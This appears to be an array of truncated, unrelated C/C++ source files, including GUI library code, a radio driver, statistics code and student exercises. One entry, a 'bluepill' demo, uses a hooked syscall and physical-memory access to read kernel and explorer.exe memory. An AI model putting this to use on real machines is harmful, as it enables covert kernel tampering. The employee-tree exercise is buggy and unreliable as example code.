vector<string> tiposRoupas = {\"Adulto\", \"Infantil\"};\n    vector<string> tamanhos = {\"P\", \"M\", \"G\", \"GG\"};\n\n    // Boas-vindas ao usu\u00e1rio\n    cout << \"Bem-vindo a Beedu Beauty!\\n\";\n\n    // Loop para manter o programa rodando\n    while (true) {\n        // Mostra o menu de op\u00e7\u00f5es\n        cout << \"\\nMenu:\\n\";\n        cout << \"1. Adicionar roupa\\n\";\n        cout << \"2. Remover roupa\\n\";\n        cout << \"3. Exibir roupas\\n\";\n        cout << \"4. Sair\\n\";\n        cout << \"Escolha uma opcao: \";\n        \n        // L\u00ea a op\u00e7\u00e3o escolhida pelo usu\u00e1rio\n        int opcao;\n        cin >> opcao;\n\n        // Processa a op\u00e7\u00e3o escolhida\n        switch (opcao) {\n            case 1: {\n                // Pede ao usu\u00e1rio informa\u00e7\u00f5es para criar uma nova roupa\n                string tipo, tamanho, tipoTecido, faixaEtaria;\n                int id;\n                cout << \"ID da roupa: \";\n                cin >> id;\n                cout << \"Tipo de roupa (Adulto/Infantil): \";\n                cin >> tipo;\n                cout << \"Tamanho (P/M/G/GG): \";\n                cin >> tamanho;\n                \n                // Dependendo do tipo de roupa, pega mais informa\u00e7\u00f5es\n                if (tipo == \"Adulto\") {\n                    cout << \"Tipo de tecido: \";\n                    cin >> tipoTecido;\n                    // Cria uma nova roupa adulta e adiciona \u00e0 loja\n                    RoupaAdulta* roupaAdulta = new RoupaAdulta(id, tipo, tamanho, tipoTecido);\n                    loja.adicionar_roupa(roupaAdulta);\n                } else if (tipo == \"Infantil\") {\n                    cout << \"Faixa etaria: \";\n                    cin >> faixaEtaria;\n                    // Cria uma nova roupa infantil e adiciona \u00e0 loja\n                    RoupaInfantil* roupaInfantil = new R",
    "#include \"Connections/RF24Connection.h\"\n\nRF24Connection::RF24Connection(int cepin, int cspin, const uint8_t *address) : rf24(RF24(cepin, cspin))\n{\n\tmemcpy(rf24_address, address, 5);\n}\n\nRF24Connection::RF24Connection(RF24 &rf24, const uint8_t *address) : rf24(rf24)\n{\n\tmemcpy(rf24_address, address, 5);\n\tisRF24Initialized = true;\n}\n\nvoid RF24Connection::useSpecificSPIBus(_SPI *spiBus)\n{\n\tnonDefaultSPI = spiBus;\n}\n\nbool RF24Connection::begin()\n{\n\tif (!isRF24Initialized)\n\t{\n\t\t// Connect to the NRF24L01 module\n\t\tif (nonDefaultSPI)\n\t\t{\n\t\t\t// If a non-default SPI bus was specified use this one\n\t\t\tif (!rf24.begin(nonDefaultSPI))\n\t\t\t\treturn false;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t// Use default SPI bus\n\t\t\tif (!rf24.begin())\n\t\t\t\treturn false;\n\t\t}\n\t\t// NRF24L01 configuration\n\t\trf24.setPALevel(RF24_PA_HIGH);\n\n\t\tisRF24Initialized = true;\n\t}\n\t// Required NRF24L01 settings for RF24 to work\n\trf24.enableDynamicPayloads();\n\trf24.setAutoAck(true);\n\trf24.openReadingPipe(1, rf24_address);\n\trf24.startListening();\n\treturn true;\n}\n\nvoid RF24Connection::end()\n{\n\trf24.closeReadingPipe(1);\n\trf24.powerDown();\n\tisRF24Initialized = false;\n}\n\nbool RF24Connection::available()\n{\n\treturn rf24.available();\n}\n\nvoid RF24Connection::read(void *buffer, size_t length)\n{\n\trf24.read(buffer, length);\n}\n\nsize_t RF24Connection::getPayloadSize()\n{\n\treturn rf24.getDynamicPayloadSize();\n}\n\nbool RF24Connection::write(const void *buffer, size_t length)\n{\n\trf24.stopListening();\n\trf24.closeReadingPipe(1);\n\trf24.openWritingPipe(rf24_address);\n\tbool success = rf24.write(buffer, length);\n\trf24.openReadingPipe(1, rf24_address);\n\trf24.startListening();\n\treturn success;\n}\n\nsize_t RF24Connection::getMaxPackageSize()\n{\n\treturn maxPackageSize;\n}\n",
    "/*-------------------------------------------------------------------------------\n  This file is part of generalized random forest (grf).\n\n  grf is free software: you can redistribute it and/or modify\n  it under the terms of the GNU General Public License as published by\n  the Free Software Foundation, either version 3 of the License, or\n  (at your option) any later version.\n\n  grf is distributed in the hope that it will be useful,\n  but WITHOUT ANY WARRANTY; without even the implied warranty of\n  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n  GNU General Public License for more details.\n\n  You should have received a copy of the GNU General Public License\n  along with grf. If not, see <http://www.gnu.org/licenses/>.\n #-------------------------------------------------------------------------------*/\n\n#include <cmath>\n#include <vector>\n\n#include \"commons/Data.h\"\n#include \"commons/utility.h\"\n#include \"prediction/InstrumentalPredictionStrategy.h\"\n\nnamespace grf {\n\nconst std::size_t InstrumentalPredictionStrategy::OUTCOME = 0;\nconst std::size_t InstrumentalPredictionStrategy::TREATMENT = 1;\nconst std::size_t InstrumentalPredictionStrategy::INSTRUMENT = 2;\nconst std::size_t InstrumentalPredictionStrategy::OUTCOME_INSTRUMENT = 3;\nconst std::size_t InstrumentalPredictionStrategy::TREATMENT_INSTRUMENT = 4;\nconst std::size_t InstrumentalPredictionStrategy::INSTRUMENT_INSTRUMENT = 5;\nconst std::size_t InstrumentalPredictionStrategy::WEIGHT = 6;\nconst std::size_t InstrumentalPredictionStrategy::NUM_TYPES = 7;\n\nsize_t InstrumentalPredictionStrategy::prediction_length() const {\n    return 1;\n}\n\n/**\n * In the presence of sample weights Gi, the score condition for IV forests\n * is E[psi_{mu(x),tau(x)}(Yi, Wi, Zi, Gi) | Xi = x] = 0, where\n *\n * psi_{mu,tau}^1(Yi, Wi, Zi, Gi) = Gi Zi (Yi - Wi tau - mu),\n * psi_{mu,tau}^2(Yi, Wi, Zi, Gi) = Gi (Yi - Wi tau - mu),\n *\n * which yields an expression for tau(x):\n *\n * tau(x) = (E[Gi Zi Yi | Xi = x] * E[Gi | Xi = x] - E[Gi Zi| Xi = x] * E[Gi Yi | Xi = x])\n *             / (E[Gi Zi Wi | Xi = x] * E[Gi | Xi = x] - E[Gi Zi| Xi = x] * E[Gi Wi | Xi = x]).\n *\n * We then estimate all conditional expectations via forest weighting.\n */\nstd::vector<double> InstrumentalPredictionStrategy::predict(const std::vector<double>& average) const {\n  double instrument_effect_numerator = average.at(OUTCOME_INSTRUMENT) * average.at(WEIGHT)\n    - average.at(OUTCOME) * average.at(INSTRUMENT);\n  double first_stage_numerator = average.at(TREATMENT_INSTRUMENT) * average.at(WEIGHT)\n    - average.at(TREATMENT) * average.at(INSTRUMENT);\n\n  return { instrument_effect_numerator / first_stage_numerator };\n}\n\n/**\n * Continuing from above, the Hessian V(x) associated with our estimating equation is\n *\n * V11(x) = E[Gi Zi Wi | Xi = x],\n * V12(x) = E[Gi Zi | Xi = x],\n * V21(x) = E[Gi Wi | Xi = x],\n * V22(x) = E[Gi | Xi = x].\n *\n * To estimate the variance, we use the bootstrap of little bags delta\n * method, which is equivalent to using a bootstrap of little bags with\n * pseudo outcomes (all \"hat\" omitted in second expression for conciseness):\n *\n * rhoi = \\xi' hat{V}^{-1} psi_{hat{mu}, hat{tau}}(Yi, Wi, Zi, Gi)\n *      = (E[Gi | Xi = x] * Gi Zi (Yi - Wi tau - mu) - E[Gi Zi | Xi = x] * Gi (Yi - Wi tau - mu))\n *           / (E[Gi Zi Wi | Xi = x] * E[Gi | Xi = x] - E[Gi Zi| Xi = x] * E[Gi Wi | Xi = x]).\n * \\xi = (1 0)\n * As usual, we take forest-weighted estimates for the unknown quantities.\n */\nstd::vector<double> InstrumentalPredictionStrategy::compute_variance(\n    const std::vector<double>& average,\n    const PredictionValues& leaf_values,\n    size_t ci_group_size) const {\n\n  double instrument_effect_numerator = average.at(OUTCOME_INSTRUMENT) * average.at(WEIGHT)\n     - average.at(OUTCOME) * average.at(INSTRUMENT);\n  double first_stage_numerator = average.at(TREATMENT_INSTRUMENT) * average.at(WEIGHT)\n     - average.at(TREATMENT) * average.at(INSTRUMENT);\n  double treatment_effect_estimate = instrument_effect_numerator / first_stage_numerator;\n  double main_effect_estimate = (average.at(OUTCOME) - average.at(TREATMENT) * treatment_effect_estimate)\n     / average.at(WEIGHT);\n\n  double num_good_groups = 0;\n  double rho_squared = 0;\n  double rho_grouped_squared = 0;\n\n  for (size_t group = 0; group < leaf_values.get_num_nodes() / ci_group_size; ++group) {\n    bool good_group = true;\n    for (size_t j = 0; j < ci_group_size; ++j) {\n      if (leaf_values.empty(group * ci_group_size + j)) {\n        good_group = false;\n      }\n    }\n    if (!good_group) continue;\n\n    num_good_groups++;\n\n    double group_rho = 0;\n\n    for (size_t j = 0; j < ci_group_size; ++j) {\n\n      size_t i = group * ci_group_size + j;\n      const std::vector<double>& leaf_value = leaf_values.get_values(i);\n\n      double psi_1 = leaf_value.at(OUTCOME_INSTRUMENT)\n                     - leaf_value.at(TREATMENT_INSTRUMENT) * treatment_effect_estimate\n                     - leaf_value.at(INSTRUMENT) * main_effect_estimate;\n      double psi_2 =",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_praktikum_state1_multi\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// dear imgui, v1.90.1 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//  ",
    "#include \"Judge.h\"\r\n\r\nbool userWin(const int x, const int y, const int M, const int N, int *const *board)\r\n{\r\n    //\u6a2a\u5411\u68c0\u6d4b\r\n    int i, j;\r\n    int count = 0;\r\n    for (i = y; i >= 0; i--)\r\n        if (!(board[x][i] == 1))\r\n            break;\r\n    count += (y - i);\r\n    for (i = y; i < N; i++)\r\n        if (!(board[x][i] == 1))\r\n            break;\r\n    count += (i - y - 1);\r\n    if (count >= 4)\r\n        return true;\r\n\r\n    //\u7eb5\u5411\u68c0\u6d4b\r\n    count = 0;\r\n    for (i = x; i < M; i++)\r\n        if (!(board[i][y] == 1))\r\n            break;\r\n    count += (i - x);\r\n    if (count >= 4)\r\n        return true;\r\n\r\n    //\u5de6\u4e0b-\u53f3\u4e0a\r\n    count = 0;\r\n    for (i = x, j = y; i < M && j >= 0; i++, j--)\r\n        if (!(board[i][j] == 1))\r\n            break;\r\n    count += (y - j);\r\n    for (i = x, j = y; i >= 0 && j < N; i--, j++)\r\n        if (!(board[i][j] == 1))\r\n            break;\r\n    count += (j - y - 1);\r\n    if (count >= 4)\r\n        return true;\r\n\r\n    //\u5de6\u4e0a-\u53f3\u4e0b\r\n    count = 0;\r\n    for (i = x, j = y; i >= 0 && j >= 0; i--, j--)\r\n        if (!(board[i][j] == 1))\r\n            break;\r\n    count += (y - j);\r\n    for (i = x, j = y; i < M && j < N; i++, j++)\r\n        if (!(board[i][j] == 1))\r\n            break;\r\n    count += (j - y - 1);\r\n    if (count >= 4)\r\n        return true;\r\n\r\n    return false;\r\n}\r\n\r\nbool machineWin(const int x, const int y, const int M, const int N, int *const *board)\r\n{\r\n    //\u6a2a\u5411\u68c0\u6d4b\r\n    int i, j;\r\n    int count = 0;\r\n    for (i = y; i >= 0; i--)\r\n        if (!(board[x][i] == 2))\r\n            break;\r\n    count += (y - i);\r\n    for (i = y; i < N; i++)\r\n        if (!(board[x][i] == 2))\r\n            break;\r\n    count += (i - y - 1);\r\n    if (count >= 4)\r\n        return true;\r\n\r\n    //\u7eb5\u5411\u68c0\u6d4b\r\n    count = 0;\r\n    for (i = x; i < M; i++)\r\n        if (!(board[i][y] == 2))\r\n            break;\r\n    count += (i - x);\r\n    if (count >= 4)\r\n        return true;\r\n\r\n    //\u5de6\u4e0b-\u53f3\u4e0a\r\n    count = 0;\r\n    for (i = x, j = y; i < M && j >= 0; i++, j--)\r\n        if (!(board[i][j] == 2))\r\n            break;\r\n    count += (y - j);\r\n    for (i = x, j = y; i >= 0 && j < N; i--, j++)\r\n        if (!(board[i][j] == 2))\r\n            break;\r\n    count += (j - y - 1);\r\n    if (count >= 4)\r\n        return true;\r\n\r\n    //\u5de6\u4e0a-\u53f3\u4e0b\r\n    count = 0;\r\n    for (i = x, j = y; i >= 0 && j >= 0; i--, j--)\r\n        if (!(board[i][j] == 2))\r\n            break;\r\n    count += (y - j);\r\n    for (i = x, j = y; i < M && j < N; i++, j++)\r\n        if (!(board[i][j] == 2))\r\n            break;\r\n    count += (j - y - 1);\r\n    if (count >= 4)\r\n        return true;\r\n\r\n    return false;\r\n}\r\n\r\nbool isTie(const int N, const int *top)\r\n{\r\n    bool tie = true;\r\n    for (int i = 0; i < N; i++)\r\n    {\r\n        if (top[i] > 0)\r\n        {\r\n            tie = false;\r\n            break;\r\n        }\r\n    }\r\n    return tie;\r\n}",
    "// dear imgui, v1.90 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Exa",
    "#include <iostream>\r\nusing namespace std;\r\nstruct node\r\n{\r\n    node *temp, *left, *right;\r\n    string name, id;\r\n    int salary;\r\n};\r\n\r\nnode *getnode()\r\n{\r\n    node *temp;\r\n\r\n    temp = new node;\r\n    cout << \"Enter the name of Employee\\n\";\r\n    cin >> temp->name;\r\n    cout << \"Enter the Employee salary\\n\";\r\n    cin >> temp->salary;\r\n    cout << \"Enter the Employee ID\\n\";\r\n    cin >> temp->id;\r\n    temp->left = NULL;\r\n    temp->right = NULL;\r\n    return temp;\r\n}\r\n\r\nnode *create()\r\n{\r\n    node *temp, *New, *root = NULL;\r\n\r\n    int choice;\r\n\r\n    do\r\n    {\r\n        New = getnode();\r\n\r\n        if (root == NULL)\r\n        {\r\n            root = New;\r\n            cout << \"Inserted at root node.....\\n\";\r\n        }\r\n\r\n        else\r\n        {\r\n            temp = root;\r\n            while (true)\r\n            {\r\n\r\n                if (New->salary < root->salary)\r\n                {\r\n                    if (temp->left == NULL)\r\n                    {\r\n                        temp->left = New;\r\n                        cout << \"Employee data inserted at left.. \\n\";\r\n                        break;\r\n                    }\r\n\r\n                    else\r\n                    {\r\n                        temp = temp->left;\r\n                    }\r\n                }\r\n\r\n                else\r\n                {\r\n                    if (New->salary > root->salary)\r\n                    {\r\n                        if (temp->right == NULL)\r\n                        {\r\n                            temp->right = New;\r\n                            cout << \"Employee Data inserted at right..\\n\";\r\n                            break;\r\n                        }\r\n\r\n                        else\r\n                        {\r\n                            temp = temp->right;\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        cout << \"Do you want to continue\\n\";\r\n        cin >> choice;\r\n\r\n    } while (choice == 1);\r\n    return root;\r\n}\r\n\r\nnode *insert(node *root)\r\n{\r\n    node *New, *temp;\r\n    int c;\r\n    do\r\n    {\r\n        New = getnode();\r\n\r\n        if (New->salary < root->salary)\r\n        {\r\n            if (temp->left == NULL)\r\n            {\r\n                temp->left = New;\r\n                break;\r\n            }\r\n\r\n            else\r\n            {\r\n                temp = temp->left;\r\n            }\r\n        }\r\n\r\n        else\r\n        {\r\n            if (New->salary > root->salary)\r\n            {\r\n                if (temp->right == NULL)\r\n                {\r\n                    temp->right = New;\r\n                    break;\r\n                }\r\n\r\n                else\r\n                {\r\n                    temp = temp->right;\r\n                }\r\n            }\r\n        }\r\n\r\n        cout << \"Do you want to continue(1 or 0)\\n\";\r\n        cin >> c;\r\n    } while (c == 1);\r\n    return root;\r\n}\r\n\r\nvoid minimum_salary(node *temp)\r\n{\r\n\r\n    while (temp->left != NULL)\r\n    {\r\n        temp = temp->left;\r\n    }\r\n\r\n    cout << \"Name:\" << temp->name << \"\\t\"\r\n         << \"Salary:\" << temp->salary << \"\\t\"\r\n         << \"ID:\" << temp->id << endl;\r\n}\r\n\r\nvoid maximum_salary(node *temp)\r\n{\r\n\r\n    while (temp->right != NULL)\r\n    {\r\n        temp = temp->right;\r\n    }\r\n\r\n    cout << \"Name:\" << temp->name << \"\\t\"\r\n         << \"Salary:\" << temp->salary << \"\\t\"\r\n         << \"ID:\" << temp->id << endl;\r\n}\r\n\r\nnode *delete_all(node *temp)\r\n{\r\n//     temp = NULL;\r\n//     if (temp->left != NULL)\r\n//         delete_all(temp->left);\r\n//     if (temp->right != NULL)\r\n//         delete_all(temp->right);\r\n    delete temp;\r\n    return NULL;\r\n}\r\n\r\nnode *find_employee(node *temp, int key)\r\n{\r\n    if (temp == NULL)\r\n    {\r\n        return NULL;\r\n    }\r\n\r\n    if (temp->salary == key)\r\n    {\r\n        cout << \"Data found..\\n\";\r\n        cout << \"Name:\" << temp->name << \"\\t\"\r\n             << \"Salary:\" << temp->salary << \"\\t\"\r\n             << \"ID:\" << temp->id << endl;\r\n    }\r\n    if (key < temp->salary)\r\n        find_employee(temp->left, key);\r\n    else\r\n        find_employee(temp->right, key);\r\n}\r\n\r\n\r\nnode* delete_specific_data(node *temp,int key)\r\n{\r\n\r\n}\r\nvoid inorder_display(node *temp)\r\n{\r\n    if (temp == NULL)\r\n    {\r\n        cout << \"Empty Tree\\n\";\r\n        return;\r\n    }\r\n\r\n    else\r\n    {\r\n        if (temp->left != NULL)\r\n            inorder_display(temp->left);\r\n        cout << \"Name:\" << temp->name << \"\\t\"\r\n             << \"Salary:\" << temp->salary << \"\\t\"\r\n             << \"ID:\" << temp->id << endl;\r\n        if (temp->right != NULL)\r\n            inorder_display(temp->right);\r\n    }\r\n}\r\n\r\nvoid preorder_display(node *temp)\r\n{\r\n    if (temp == NULL)\r\n    {\r\n        cout << \"Empty Tree\\n\";\r\n        return;\r\n    }\r\n\r\n    else\r\n    {\r\n        cout << \"Name:\" << temp->name << \"\\t\"\r\n             << \"Salary:\" << temp->salary << \"\\t\"\r\n             << \"ID:\" << temp->id << endl;\r\n        if (temp->left != NULL)\r\n            inorder_display(temp->left);\r\n        if (temp->right != NULL)\r\n            inorder_display(temp->right);\r\n    }\r\n}\r\n\r\nvoid postorder_display(n",
    "#include \"bluepill.h\"\n#include \"vdm_ctx/vdm_ctx.hpp\"\n\nauto __cdecl main(int argc, char** argv) -> void\n{\n\tvdm::read_phys_t _read_phys =\n\t\t[&](void* addr, void* buffer, std::size_t size) -> bool\n\t{\n\t\treturn bluepill::read_phys(\n\t\t\treinterpret_cast<u64>(addr), buffer, size);\n\t};\n\n\tvdm::write_phys_t _write_phys =\n\t\t[&](void* addr, void* buffer, std::size_t size) -> bool\n\t{\n\t\treturn bluepill::write_phys(\n\t\t\treinterpret_cast<u64>(addr), buffer, size);\n\t};\n\n\tvdm::vdm_ctx vdm(_read_phys, _write_phys);\n\tconst auto ntoskrnl_base =\n\t\treinterpret_cast<void*>(\n\t\t\tutil::get_kmodule_base(\"ntoskrnl.exe\"));\n\n\tconst auto ntoskrnl_memcpy =\n\t\tutil::get_kmodule_export(\"ntoskrnl.exe\", \"memcpy\");\n\n\tstd::printf(\"[+] %s physical address -> 0x%p\\n\", vdm::syscall_hook.first, vdm::syscall_address.load());\n\tstd::printf(\"[+] %s page offset -> 0x%x\\n\", vdm::syscall_hook.first, vdm::nt_page_offset);\n\tstd::printf(\"[+] ntoskrnl base address -> 0x%p\\n\", ntoskrnl_base);\n\tstd::printf(\"[+] ntoskrnl memcpy address -> 0x%p\\n\", ntoskrnl_memcpy);\n\n\tshort mz_bytes = 0;\n\tvdm.syscall<decltype(&memcpy)>(\n\t\tntoskrnl_memcpy,\n\t\t&mz_bytes,\n\t\tntoskrnl_base,\n\t\tsizeof mz_bytes\n\t);\n\n\tstd::printf(\"[+] kernel MZ -> 0x%x\\n\", mz_bytes);\n\tstd::getchar();\n\n\tconst auto explorer_pid = util::get_pid(\"explorer.exe\");\n\tconst auto explorer_dirbase = vdm.get_dirbase(explorer_pid);\n\tconst auto explorer_base = vdm.get_base_address(explorer_pid);\n\n\tstd::printf(\"explorer.exe pid -> %d\\n\", explorer_pid);\n\tstd::printf(\"explorer.exe dirbase -> 0x%p\\n\", explorer_dirbase);\n\tstd::printf(\"explorer.exe base address -> 0x%p\\n\", explorer_base);\n\tstd::printf(\"explorer.exe MZ -> 0x%x\\n\", bluepill::rpm<short>(explorer_dirbase, explorer_base));\n\tstd::getchar();\n}",
    "/*****************************************************************************\n*  Copyright Statement:\n*  --------------------\n*  This software is protected by Copyright and the information contained\n*  herein is confidential. The software may not be copied and the information\n*  contained herein may not be used or disclosed except with the written\n*  permission of MediaTek Inc. (C) 2020\n*\n*  BY OPENING THIS FILE, BUYER HEREBY UNEQUIVOCALLY ACKNOWLEDGES AND AGREES\n*  THAT THE SOFTWARE/FIRMWARE AND ITS DOCUMENTATIONS (\"MEDIATEK SOFTWARE\")\n*  RECEIVED FROM MEDIATEK AND/OR ITS REPRESENTATIVES ARE PROVIDED TO BUYER ON\n*  AN \"AS-IS\" BASIS ONLY. MEDIATEK EXPRESSLY DISCLAIMS ANY AND ALL WARRANTIES,\n*  EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF\n*  MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE OR NONINFRINGEMENT.\n*  NEITHER DOES MEDIATEK PROVIDE ANY WARRANTY WHATSOEVER WITH RESPECT TO THE\n*  SOFTWARE OF ANY THIRD PARTY WHICH MAY BE USED BY, INCORPORATED IN, OR\n*  SUPPLIED WITH THE MEDIATEK SOFTWARE, AND BUYER AGREES TO LOOK ONLY TO SUCH\n*  THIRD PARTY FOR ANY WARRANTY CLAIM RELATING THERETO. MEDIATEK SHALL ALSO\n*  NOT BE RESPONSIBLE FOR ANY MEDIATEK SOFTWARE RELEASES MADE TO BUYER'S\n*  SPECIFICATION OR TO CONFORM 